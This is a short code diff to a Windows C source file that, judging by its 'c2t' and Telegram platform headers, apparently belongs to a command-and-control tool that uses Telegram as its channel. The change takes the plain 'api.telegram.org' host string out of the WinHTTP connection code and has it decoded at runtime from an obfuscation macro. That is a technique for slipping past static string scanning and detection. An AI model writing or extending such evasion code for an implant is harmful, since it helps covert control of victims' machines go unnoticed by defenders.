@@ -17,6 +17,7 @@
 
 #include "telegram_platform.h"
 #include "../logging/logging.h"
+#include "../crypto/obfuscate.h"
 #include "c2t_version.h"
 
 #define WIN32_LEAN_AND_MEAN
@@ -60,7 +61,11 @@ int telegram_http_init(void)
                           WINHTTP_NO_PROXY_BYPASS, 0);
     if (session) {
         WinHttpSetTimeouts(session, 5000, 5000, 5000, 15000);
-        connection = WinHttpConnect(session, L"api.telegram.org",
+        char host_mb[OBF_HOST_TELEGRAM_LEN + 1];
+        DEOBF_HOST_TELEGRAM(host_mb);
+        wchar_t host_w[64];
+        MultiByteToWideChar(CP_UTF8, 0, host_mb, -1, host_w, 64);
+        connection = WinHttpConnect(session, host_w,
                                     INTERNET_DEFAULT_HTTPS_PORT, 0);
     }
     if (!session || !connection) {
